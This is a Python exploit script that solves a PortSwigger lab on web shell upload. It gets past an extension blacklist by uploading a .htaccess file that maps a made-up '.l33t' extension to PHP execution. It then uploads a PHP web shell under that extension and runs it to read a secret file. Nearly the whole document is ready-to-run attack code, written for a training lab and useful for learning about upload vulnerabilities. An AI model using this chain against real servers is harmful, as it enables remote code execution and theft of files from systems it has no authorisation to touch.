# Lab 04 — Web shell upload via extension blacklist bypass
# PortSwigger: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass
#
# Vulnerability: The extension blacklist is missing .htaccess, and the
#                (Apache) server will process an uploaded .htaccess file
#                — letting us remap an arbitrary, non-blacklisted
#                extension to be executed as PHP
# Aim:           Upload a basic PHP web shell and exfiltrate
#                /home/carlos/secret
#
# Technique:
#   1. Confirm the server is Apache (via the Server response header).
#   2. Upload a .htaccess file that maps a made-up extension to PHP execution.
#   3. Upload the payload using that new, non-blacklisted extension.
#   4. Request it — Apache now executes it as PHP per our .htaccess rule.
#
# Usage: python file_upload_lab04.py <url>

import sys
import urllib3
from proxies import proxies
from file_upload_utils import (banner, section, make_session, login,
                                PHP_PAYLOAD, upload_avatar, check_status, print_box)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

CUSTOM_EXTENSION = "l33t"
HTACCESS_CONTENT = f"AddType application/x-httpd-php .{CUSTOM_EXTENSION}"

if __name__ == "__main__":
    banner()
    section("LAB 04 — WEB SHELL UPLOAD VIA EXTENSION BLACKLIST BYPASS (.htaccess)")

    if len(sys.argv) != 2:
        print("  Usage: python file_upload_lab04.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    if not login(session, url):
        sys.exit(1)

    # ── Step 1: confirm the server is Apache ──────────────────────────────────
    print("\n  ── Step 1: confirm the server software\n")
    r_home = session.get(url)
    server_header = r_home.headers.get("Server", "")
    print(f"  ℹ  Server header: {server_header}")
    if "apache" not in server_header.lower():
        print("  ⚠  Server doesn't appear to be Apache — .htaccess bypass may")
        print("     not apply. Continuing anyway per the lab's known setup.\n")
    else:
        print("  ✔  Apache confirmed — .htaccess processing likely enabled\n")

    # ── Step 2: upload the .htaccess remapping our custom extension ──────────
    print(f"  ── Step 2: upload .htaccess mapping .{CUSTOM_EXTENSION} → PHP execution\n")
    print_box(".htaccess contents", HTACCESS_CONTENT)

    r_htaccess = upload_avatar(session, url, ".htaccess", HTACCESS_CONTENT, content_type="image/jpeg")
    check_status(r_htaccess, [200, 302], "Upload .htaccess")

    # ── Step 3: upload the payload with the custom extension ─────────────────
    print(f"\n  ── Step 3: upload the PHP payload as exploit.{CUSTOM_EXTENSION}\n")
    r_payload = upload_avatar(session, url, f"exploit.{CUSTOM_EXTENSION}", PHP_PAYLOAD, content_type="image/jpeg")
    check_status(r_payload, [200, 302], f"Upload exploit.{CUSTOM_EXTENSION}")

    # ── Step 4: request it — Apache now executes it as PHP ────────────────────
    print(f"\n  ── Step 4: request exploit.{CUSTOM_EXTENSION} to trigger execution\n")
    r_exec = session.get(f"{url}/files/avatars/exploit.{CUSTOM_EXTENSION}")
    check_status(r_exec, 200, f"GET /files/avatars/exploit.{CUSTOM_EXTENSION}")

    print_box("LEAKED SECRET", r_exec.text.strip())

    print()
    print("  ℹ  The blacklist correctly blocked every KNOWN dangerous")
    print("     extension — but never anticipated a file that could")
    print("     REDEFINE what counts as executable in that directory.")
